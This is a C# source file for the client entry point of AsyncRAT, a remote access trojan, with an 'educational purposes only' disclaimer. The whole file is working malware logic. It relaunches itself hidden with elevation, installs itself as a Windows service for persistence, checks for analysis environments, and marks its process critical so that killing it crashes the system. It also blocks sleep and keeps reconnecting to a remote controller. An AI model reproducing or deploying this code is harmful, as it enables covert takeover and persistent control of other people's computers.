using System;
using System.Diagnostics;
using System.ServiceProcess;
using System.Threading;
using Client.Connection;
using Client.Helper;
using Client.Service;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program is distributed for educational purposes only.
*/

namespace Client
{
    public class Program
    {
        private static Thread clientThread;
        private static CancellationTokenSource interactiveCancellation;

        public static void Main()
        {
            string[] args = Environment.GetCommandLineArgs();

            if (Environment.UserInteractive)
            {
                if (TryElevateIfNeeded(args))
                    return;

                if (HandleServiceCommands(args))
                    return;

#if DEBUG
                interactiveCancellation = new CancellationTokenSource();
                StartClient(interactiveCancellation.Token);
                interactiveCancellation.Token.WaitHandle.WaitOne();
#else
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                ServiceRegistrar.EnsureInstalled(AgentService.ServiceIdentifier, AgentService.ServiceDisplayName, AgentService.ServiceDescription, exePath);
                return;
#endif
            }
            else
            {
                ServiceBase.Run(new ServiceBase[] { new AgentService() });
            }
        }

        internal static void StartClient(CancellationToken cancellationToken)
        {
            clientThread = new Thread(() => RunClient(cancellationToken))
            {
                IsBackground = true
            };
            clientThread.Start();
        }

        internal static void StopClient()
        {
            Methods.ClientOnExit();
            try
            {
                interactiveCancellation?.Cancel();
            }
            catch { }

            try
            {
                if (clientThread != null && clientThread.IsAlive)
                {
                    if (!clientThread.Join(5000))
                    {
                        try { clientThread.Interrupt(); } catch { }
                    }
                }
            }
            catch { }

            ClientSocket.Reconnect();
        }

        private static void RunClient(CancellationToken cancellationToken)
        {
            for (int i = 0; i < Convert.ToInt32(Settings.Delay); i++)
            {
                if (cancellationToken.WaitHandle.WaitOne(1000))
                    return;
            }

            if (!Settings.InitializeSettings())
            {
                return;
            }

            try
            {
                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                    return;

                if (Convert.ToBoolean(Settings.Anti)) //run anti-virtual environment
                    Anti_Analysis.RunAntiAnalysis();

                if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin()) //active critical process
                    ProcessCritical.Set();

                Methods.PreventSleep(); //prevent pc to idle\sleep

            }
            catch { }

            while (!cancellationToken.IsCancellationRequested) // ~ loop to check socket status
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        ClientSocket.Reconnect();
                        ClientSocket.InitializeClient();
                    }
                }
                catch { }

                if (cancellationToken.WaitHandle.WaitOne(5000))
                    break;
            }

            ClientSocket.Reconnect();
        }

        private static bool HandleServiceCommands(string[] args)
        {
            if (args == null || args.Length == 0)
                return false;

            foreach (string raw in args)
            {
                if (string.IsNullOrEmpty(raw))
                    continue;

                string arg = raw.ToLowerInvariant();
                if (arg == "--install" || arg == "-install" || arg == "/install")
                {
                    string exePath = Process.GetCurrentProcess().MainModule.FileName;
                    ServiceRegistrar.EnsureInstalled(AgentService.ServiceIdentifier, AgentService.ServiceDisplayName, AgentService.ServiceDescription, exePath);
                    return true;
                }

                if (arg == "--uninstall" || arg == "-uninstall" || arg == "/uninstall")
                {
                    ServiceRegistrar.Uninstall(AgentService.ServiceIdentifier);
                    return true;
                }
            }

            return false;
        }

        private static bool TryElevateIfNeeded(string[] args)
        {
            if (Methods.IsAdmin())
                return false;

            try
            {
                string elevationArgs = (args != null && args.Length > 1)
                    ? string.Join(" ", args, 1, args.Length - 1)
                    : "--install";

                Process.Start(new ProcessStartInfo
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    Arguments = elevationArgs,
                    Verb = "runas",
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }

            return true;
        }
    }
}
